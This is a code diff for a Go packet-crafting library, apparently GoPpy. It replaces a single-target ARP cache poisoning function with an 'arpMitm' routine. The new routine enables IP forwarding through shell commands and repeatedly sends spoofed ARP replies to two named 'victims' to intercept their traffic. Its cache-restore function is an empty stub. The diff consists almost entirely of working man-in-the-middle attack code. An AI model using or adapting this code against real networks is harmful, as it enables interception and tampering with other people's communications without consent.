@@ -1,11 +1,14 @@
 package higherlevel
 
 import (
+	"fmt"
 	"github.com/google/gopacket/layers"
 	"github.com/tiagomdiogo/GoPpy/packet"
 	"github.com/tiagomdiogo/GoPpy/supersocket"
 	"github.com/tiagomdiogo/GoPpy/utils"
+	"log"
 	"net"
+	"os/exec"
 	"time"
 )
 
@@ -60,69 +63,71 @@ func ARPScan(iface string, targetIP string) (string, error) {
 		}
 	}
 }
+func enableIPForwarding(iface string) {
+	exec.Command("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward").Run()
+	exec.Command("sh", "-c", fmt.Sprintf("echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects", iface)).Run()
+	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects").Run()
+}
 
-func ARPCachePoison(iface string, targetIP string, gatewayIP string) error {
-	// Get MAC address of interface
-	srcMAC, err := utils.MacByInt(iface)
-	if err != nil {
-		return err
-	}
+func disableIPForwarding() {
+	exec.Command("sh", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward").Run()
+}
 
-	// Get the MAC address of the target
-	targetMAC, err := ARPScan(iface, targetIP)
-	if err != nil {
-		return err
-	}
+func arpMitm(iface, victim1, victim2 string) {
+	enableIPForwarding(iface)
+	defer disableIPForwarding()
 
-	// Create a new SuperSocket
+	fmt.Println("[*] Enabled IP Forwarding")
+
 	ss, err := supersocket.NewSuperSocket(iface, "")
 	if err != nil {
-		return err
+		log.Fatal(err)
 	}
 
-	// Craft Arp Layer
-	arpLayer := packet.ARPLayer()
-	arpLayer.SetSrcMac(srcMAC)
-	arpLayer.SetDstMac(targetMAC)
-	arpLayer.SetSrcIP(gatewayIP)
-	arpLayer.SetDstIP(targetIP)
-	arpLayer.SetReply()
+	macVictim1, err := ARPScan(iface, victim1)
+	macVictim2, err := ARPScan(iface, victim2)
 
-	// Craft ARP reply packet to poison target's ARP cache
-	arpReply, err := packet.CraftPacket(arpLayer.Layer())
-	if err != nil {
-		return err
-	}
+	fmt.Println("[*] Got MAC of the victims")
+	fmt.Println(macVictim1)
+	fmt.Println(macVictim2)
 
-	// Send the ARP Reply in loop for some time (e.g. 10 seconds). This duration depends on the duration of your attack.
-	for i := 0; i < 10; i++ {
-		err = ss.Send(arpReply)
+	arpPacket1, arpPacket2 := CreateFakeArp(victim1, victim2, macVictim1, macVictim2)
+
+	for i := 0; i < 100; i++ {
+		packet1, err := packet.CraftPacket(arpPacket1.Layer())
 		if err != nil {
-			return err
+			log.Fatal(err)
 		}
+		packet2, err := packet.CraftPacket(arpPacket2.Layer())
+		if err != nil {
+			log.Fatal(err)
+		}
+		ss.Send(packet1)
+		ss.Send(packet2)
+		fmt.Println("[*] Sending Fake ARPs")
+
 		time.Sleep(1 * time.Second)
+
 	}
-	ss.Close()
+	fmt.Println("[*] Restoring original MAC")
+	replaceOriginalARP()
+}
 
-	// Craft ARP reply packet with the legitimate MAC of the gateway to restore the original ARP entry
-	gatewayMAC, err := ARPScan(iface, gatewayIP)
-	if err != nil {
-		return err
-	}
+func replaceOriginalARP() {
+	return
+}
 
-	arpLayer.SetSrcIP(gatewayIP)
-	arpLayer.SetSrcMac(gatewayMAC)
+func CreateFakeArp(victim1 string, victim2 string, macVictim1 string, macVictim2 string) (*packet.ARP, *packet.ARP) {
+	arpPacket1 := packet.ARPLayer()
+	arpPacket1.SetReply()
+	arpPacket1.SetDstIP(victim1)
+	arpPacket1.SetSrcIP(victim2)
+	arpPacket1.SetDstMac(macVictim1)
 
-	arpReplyLegit, err := packet.CraftPacket(arpLayer.Layer())
-	if err != nil {
-		return err
-	}
-
-	// Send the legitimate ARP reply to the target
-	err = ss.Send(arpReplyLegit)
-	if err != nil {
-		return err
-	}
-
-	return nil
+	arpPacket2 := packet.ARPLayer()
+	arpPacket2.SetReply()
+	arpPacket2.SetDstIP(victim2)
+	arpPacket2.SetSrcIP(victim1)
+	arpPacket2.SetDstMac(macVictim2)
+	return arpPacket1, arpPacket2
 }
